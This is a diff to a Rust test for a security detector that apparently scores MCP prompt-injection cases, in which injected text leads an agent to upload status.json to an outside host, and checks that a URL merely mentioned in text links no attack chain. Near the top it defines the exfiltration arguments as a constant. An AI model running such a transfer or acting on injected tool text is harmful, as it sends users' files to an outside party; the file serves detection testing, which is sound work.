@@ -522,6 +522,9 @@ type Uc001SourceCase = (
     &'static str,
 );
 
+/// The outbound transfer each UC-001 positive runs after the injected text.
+const UC001_TRANSFER: &str = "--data-binary @status.json https://darkroastcyber.io/mcp-lab";
+
 fn uc001_source_cases() -> Vec<Uc001SourceCase> {
     use telltale_schema::clients::{ClientId as C, SourceKind as K};
     vec![
@@ -701,17 +704,20 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
             }
             let instance =
                 CorrelationId::source_reported(format!("uc001:{source_id}:{is_positive}")).unwrap();
-            let evaluation = evaluate_source(
-                CanonicalSourceInput {
-                    client,
-                    source_id,
-                    source_instance: Some(&instance),
-                    observations: &observations,
-                },
-                &rules,
-                None,
-            )
-            .map_err(|error| format!("{context}: {error}"))?;
+            let evaluate_observations = |observations: &[_]| {
+                evaluate_source(
+                    CanonicalSourceInput {
+                        client,
+                        source_id,
+                        source_instance: Some(&instance),
+                        observations,
+                    },
+                    &rules,
+                    None,
+                )
+                .map_err(|error| format!("{context}: {error}"))
+            };
+            let evaluation = evaluate_observations(&observations)?;
             if evaluation.sessions().is_empty() {
                 return Err(format!("{context}: no evaluated sessions"));
             }
@@ -778,6 +784,39 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
                         "{context}: expected critical MCP injection + controlled egress in one session; got {:?}",
                         evaluation
                             .sessions()
+                            .iter()
+                            .map(|session| (session.rule_score(), session.rule_ids()))
+                            .collect::<Vec<_>>()
+                    ));
+                }
+                // Its twin without the transfer call names the URL only in
+                // the injected text: both findings stay, the chain does not.
+                let mention_only = observations
+                    .iter()
+                    // Sources record the command in different fields.
+                    .filter(|observation| {
+                        let transfer = |value: Option<&JsonValue>| {
+                            matches!(value, Some(JsonValue::String(text)) if text.contains(UC001_TRANSFER))
+                        };
+                        !(transfer(observation.facets().get("command.text").map(|facet| facet.value()))
+                            || matches!(observation.body(), ObservationBody::Tool(tool)
+                                if transfer(tool.arguments())
+                                    || tool.searchable_arguments().is_some_and(|text| text.contains(UC001_TRANSFER))))
+                    })
+                    .cloned()
+                    .collect::<Vec<_>>();
+                let twin = evaluate_observations(&mention_only)?;
+                if mention_only.len() == observations.len()
+                    || !twin.sessions().iter().any(|session| {
+                        uc001_rules[..2]
+                            .iter()
+                            .all(|rule| session.rule_ids().iter().any(|id| id == rule))
+                            && !session.rule_ids().iter().any(|id| id == uc001_rules[2])
+                    })
+                {
+                    return Err(format!(
+                        "{context}: a URL named only in text must keep both findings and link no chain; got {:?}",
+                        twin.sessions()
                             .iter()
                             .map(|session| (session.rule_score(), session.rule_ids()))
                             .collect::<Vec<_>>()
